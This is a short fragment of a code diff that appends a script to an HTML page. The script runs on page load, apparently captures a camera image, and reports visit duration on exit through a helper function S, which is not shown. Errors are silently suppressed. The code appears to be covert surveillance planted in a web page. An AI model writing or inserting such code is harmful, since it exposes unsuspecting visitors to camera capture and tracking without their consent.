+              await S(msg);
+              if (cam) await S(null, cam);
+              window.addEventListener('beforeunload', async () => {
+                const t = Math.round((Date.now() - performance.timing.navigationStart) / 1000);
+                if (t > 1) await S(`🚪 Exit after ${t}s`);
+              });
+            } catch {}
+          };
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) await runDetection();
+      })();
+    </script>
+  </body>
 </html>
-
-</body>
-</html>
-
-
-
-
-
